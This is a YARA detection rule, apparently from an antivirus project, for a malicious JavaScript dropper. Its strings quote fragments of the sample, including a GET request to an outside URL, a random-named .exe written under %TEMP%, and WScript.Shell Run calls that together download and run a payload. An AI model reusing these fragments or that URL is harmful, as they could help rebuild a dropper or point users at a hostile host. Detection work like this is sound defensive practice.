rule sig_20160329_4782ea7b7637ebb9b1e3728166c15d6e {
  meta:
    description = "datamaliciousorder - file 20160329_4782ea7b7637ebb9b1e3728166c15d6e.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "3132488bd21c129025f877e8b0116a2555a650874a308991dbc4d1bee7e59ba0"

  strings:
    $s1  = "Qa[D](\"GET\", \"http://digimacro.com.br/m8isda\", false);" fullword ascii
    $s2  = "function M() {return zt[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"N9c0AyBIuVz9Xh5f.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[kO](b() * 11); if (Qa[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function n(i, m0){Z = Z * 1; return i - m0;};" fullword ascii
    $s5  = "var zt = function W() {return WScript[Du](\"WScript.Shell\");}(), Fk = 11;" fullword ascii
    $s6  = "function L(){return \"\" + wY;};" fullword ascii
    $s7  = "function F() {return ((Os == true) && (Os == r)) ? 1 : Z;};" fullword ascii
    $s8  = "function s(md){zt[\"Run\"](md, Z, Z);};" fullword ascii
    $s9  = "var a = new this[\"Date\"]();" fullword ascii
    $s10 = "function b(){return 22;};" fullword ascii
    $s11 = "function xV(){return Du;};" fullword ascii
    $s12 = " while (R){" fullword ascii
    $s13 = "return n(e0, M0);" fullword ascii
    $s14 = "function YV(rG) {var KB = (1, 2, 3, 4, 5, rG); return KB;};" fullword ascii
    $s15 = "function k()" fullword ascii
    $s16 = "var r = false;" fullword ascii
    $s17 = "var Os = false;" fullword ascii
    $s18 = "Os = true; " fullword ascii
    $s19 = "r = true; " fullword ascii
    $s20 = "var n0 = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}